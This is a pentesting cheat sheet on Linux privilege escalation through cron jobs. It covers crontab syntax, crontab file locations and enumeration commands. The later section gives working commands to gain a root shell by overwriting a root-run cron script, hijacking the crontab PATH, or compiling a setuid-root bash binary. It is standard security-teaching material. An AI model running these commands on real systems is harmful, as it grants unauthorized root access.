# PrivEsc via Cron Jobs

## Theory

A cron job is a task that users can schedule to run at regular time intervals.

Cron table files (crontabs) store the configuration for cron jobs. Cron jobs in UNIX systems is a time-scheduler for programs or scripts to run at specific intervals. This are run with the security level of the user who owns them.

The /bin/sh shell is the default shell used by cron jobs, but it can be modified.

### Cron Job Structure

The structure of a cron job consists of 5 fields to indicate the time interval, followed by the user who is going to execute it and finally, the command:

```
# *  *  *  *  * <username> <command to execute>
# T  T  T  T  T
# |  |  |  |  |
# |  |  |  |  |
# |  |  |  |  .----- day of week (0 - 6) (Sunday=0 or 7)
# |  |  |  .-------- month (1 - 12)
# |  |  .----------- day of month (1 - 31)​
# |  .-------------- hour (0 - 23)​
# .----------------- minute (0 - 59)​
```

### Crontabs location <a href="#crontabs" id="crontabs"></a>

Cron table files (crontabs) store the configuration for cron jobs.

```bash
# Crontabs directories:
/var/spool/cron/
/var/spool/cron/crontabs
# Crontab file:
/etc/crontab
# List user's crontab:
crontab -l
# Allow/Deny:
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
```

As mentioned above, crontab files are generally located in `/etc/cron.d`. The crontab files that depend on the time:

```
/etc/cron.daily/
/etc/cron.hourly/
/etc/cron.monthly/
/etc/cron.weekly/
```

#### Others locations

```bash
for i in $(ls /etc/cron.d); do echo "/etc/cron.d/$i"; done | xargs cat
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cd /etc/cron.d
cat /etc/anacrontab
cat /var/spool/cron.d
cd /var/spool/cron
ls -la /var/log/cron*
```

## Privilege Escalation

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
# Wait until it is executed
/tmp/bash -p
```

If the script executed by root uses a **directory where you have full access**, maybe it could be useful to delete that folder and **create a symlink folder to another one** serving a script controlled by you:

{% hint style="danger" %}
If we have a directory with full access, it is not necessary to make a symbolic link, we simply create the payload in the /tmp directory and copy the payload in that directory with the same name to overwrite it.
{% endhint %}

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### PATH Environment Variable <a href="#path-environment-variable" id="path-environment-variable"></a>

For example, inside _/etc/crontab_ you can find the PATH:&#x20;

```
PATH=/home/leviswings:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

> Note how the user "leviswings" has writing privileges over /home/leviswings

If inside this crontab the root user tries to execute some command or script without setting the path. For example:&#x20;

```bash
* * * * * root overwrite.sh
```

Then, you can get a root shell by using:

```bash
# Method 1:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
## Wait cron job to be executed
/tmp/bash -p # The effective uid and gid to be set to the real uid and gid

# Method 2:
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); }' > /tmp/bash.c
gcc /tmp/bash.c -o /tmp/bash
chmod +s /tmp/bash
echo 'chown root:root /tmp/bash' > /home/user/overwrite.sh
```
